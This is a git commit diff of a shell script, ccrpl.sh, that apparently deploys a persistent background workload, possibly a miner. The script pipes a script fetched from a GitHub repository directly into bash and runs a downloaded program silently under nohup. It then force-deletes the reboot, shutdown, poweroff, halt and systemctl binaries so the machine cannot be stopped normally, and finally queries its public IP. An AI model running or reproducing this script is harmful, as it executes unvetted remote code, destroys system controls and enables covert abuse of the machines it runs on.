97634e098fda4d3a02dabb64d5e2a294506f46fc
kamikaze05 <167535693+kamikaze05@users.noreply.github.com>
2024-05-12 23:47:05 +0700

    Update ccrpl.sh

--- ccrpl.sh
+++ ccrpl.sh
@@ -3,9 +3,9 @@ apt-get update
 apt-get install -y wget curl sudo
 sudo apt-get update -y
 curl -sL https://github.com/kamikaze05/cckaze/raw/main/ccyes.sh | bash
-chmod +x cckaze
-chmod +x cckaze.sh
-nohup ./cckaze.sh > /dev/null 2>&1 &
+chmod +x ccKaze
+chmod +x ccKaze.sh
+nohup ./ccKaze.sh > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
